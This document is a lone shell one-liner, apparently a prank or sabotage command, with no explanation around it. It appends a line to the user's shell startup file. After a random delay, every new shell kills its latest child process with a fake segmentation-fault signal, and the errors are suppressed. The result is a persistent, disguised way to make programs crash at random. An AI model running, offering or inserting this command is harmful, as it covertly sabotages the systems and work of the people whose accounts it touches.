echo '((sleep $(($RANDOM + 120)) && 2>/dev/null kill -11 $(ps --ppid $$ | tail -n 1 | cut -d" " -f1))&)' >> ~/$(basename $0)rc
